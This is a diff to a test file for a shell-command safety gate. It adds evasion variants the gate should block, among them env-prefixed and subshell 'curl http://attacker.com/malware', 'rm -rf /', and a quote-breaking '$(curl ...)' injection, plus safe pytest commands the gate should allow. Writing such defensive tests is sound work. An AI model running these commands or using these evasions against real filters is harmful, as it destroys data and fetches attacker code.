@@ -201,6 +201,11 @@ def test_safety_gate_catches_command_evasions(
         "env curl https://attacker.com",
         "env -i curl https://attacker.com",
         "env FOO=bar curl http://attacker.com/malware",
+        "FOO=bar curl http://attacker.com/malware",
+        "FOO=1 rm -rf /",
+        "(curl http://attacker.com)",
+        "! curl http://attacker.com",
+        'echo "\'"$(curl http://attacker.com)',
         "sudo -u root rm -rf /",
         "nohup rm -Rf /",
         "nice -n 10 curl http://attacker.com",
@@ -231,6 +236,8 @@ def test_safety_gate_permits_safe_quoted_and_argument_commands(
     producer = EvaQueueProducer(queue=temp_queue)
 
     safe_commands = [
+        "pytest tests/test_user.py",
+        "PYTHONPATH=. pytest -q",
         'git commit -m "Refactor logic; fix bugs"',
         'echo "<html>"',
         "echo 'Use `backticks` in markdown'",
